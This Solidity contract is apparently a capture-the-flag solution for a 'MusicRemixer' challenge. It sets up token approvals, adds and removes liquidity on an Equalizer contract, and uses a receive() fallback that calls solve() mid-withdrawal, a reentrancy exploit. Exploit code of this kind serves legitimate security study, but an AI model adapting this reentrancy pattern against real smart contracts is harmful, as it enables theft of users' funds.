// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "./MusicRemixer.sol";

contract MusicRemixerSekai23Attack {
    MusicRemixerSekai23 remixer;
    Equalizer e;
    address[] bands;
    FreqBand token1;
    FreqBand token2;
    function setUp(address target, bytes memory sig) public payable {
        remixer = MusicRemixerSekai23(target);
        e = Equalizer(remixer.equalizer());
        remixer.getMaterial(sig);
        token1 = FreqBand(e.bands(1));
        token2 = FreqBand(e.bands(2));
        token1.approve(address(e), 1000 ether);
        token2.approve(address(e), 1000 ether);
    }

    function attack() public {
        // e.equalize{value: 0.1 ether}(0, 1, 0.1 ether);
        // e.equalize{value: 0.1 ether}(0, 2, 0.1 ether);
        // the getMaterial function could be useless

        uint[3] memory amounts = [uint(1 ether), uint(1 ether), uint(1 ether)];
        uint share = e.increaseVolume{value: 1 ether}(amounts);
        // e.getGlobalInfo();
        e.decreaseVolume(share);
        // e.getGlobalInfo();
    }

    receive() external payable {
        // remixer.finish();
        console.log("Level:", remixer.getSongLevel());
        remixer.solve();
    }
}
